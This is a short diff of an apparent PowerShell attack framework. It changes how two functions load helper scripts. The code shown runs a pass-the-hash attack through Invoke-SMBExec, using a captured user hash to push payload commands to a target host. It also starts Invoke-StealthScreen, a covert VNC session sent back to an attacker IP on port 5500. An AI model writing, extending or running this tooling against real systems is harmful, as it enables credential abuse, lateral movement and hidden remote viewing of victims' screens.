@@ -34,7 +34,7 @@ function Invoke-ARAttackPassTheHash {
     $user = [string]$script:ARTarget['User']
     $hash = [string]$script:ARTarget['Hash']
     $domain = [string]$script:ARTarget['Domain']
-    Import-ARFunctionScript 'Resources\Scripts\Invoke-SMBExec.ps1'
+    . (Get-ARResourcePath 'Resources\Scripts\Invoke-SMBExec.ps1')
     foreach ($payload in @(Get-ARPayloads)) {
         $command = Get-ARAttackPayloadCommand $payload
         Invoke-SMBExec -Target $target -Domain $domain -Username $user -Hash $hash -Command $command 2>&1 | ForEach-Object { Write-Host $_ }
@@ -177,7 +177,7 @@ function Invoke-ARAttackQuickScreen {
     $viewOnly = ([string]$script:ARTarget['Mode'] -eq 'view')
     $null = Get-ARResourcePath 'Resources\Scripts\Invoke-VNCViewer.ps1'
     $null = Get-ARResourcePath 'Resources\Scripts\Invoke-VNCServer.ps1'
-    Import-ARFunctionScript 'Resources\Scripts\Invoke-StealthScreen.ps1'
+    . (Get-ARResourcePath 'Resources\Scripts\Invoke-StealthScreen.ps1')
     Invoke-StealthScreen -Target $target -User ([string]$script:ARTarget['User']) -Pass $password -Mode view -AttackerIP $attacker -Port 5500 -ViewOnly:$viewOnly
     Set-ARStatus 'Quick Screen finished' 'Ok'
 }
